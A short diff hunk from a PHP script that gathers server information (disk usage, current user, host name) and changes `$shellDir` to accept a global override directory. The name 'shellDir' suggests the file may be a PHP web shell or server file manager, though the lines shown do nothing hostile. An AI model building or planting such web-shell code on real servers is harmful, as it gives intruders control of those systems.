@@ -462,7 +462,7 @@ $diskUsed = $diskTotal - $diskFree;
 $diskUsedPercent = ($diskTotal > 0) ? round(($diskUsed / $diskTotal) * 100, 2) : 0;
 $currentUser = function_exists('posix_getpwuid') ? posix_getpwuid(posix_geteuid())['name'] : get_current_user();
 $serverName = $_SERVER['SERVER_NAME'] ?? gethostname();
-$shellDir = __DIR__;
+$shellDir = isset($GLOBALS['OVERRIDE_DIR']) ? $GLOBALS['OVERRIDE_DIR'] : __DIR__;
 $domain = $_SERVER['HTTP_HOST'] ?? $_SERVER['SERVER_NAME'] ?? 'localhost';
 $protocol = (!empty($_SERVER['HTTPS']) && $_SERVER['HTTPS'] !== 'off') ? 'https://' : 'http://';
 $fullDomain = $protocol . $domain;
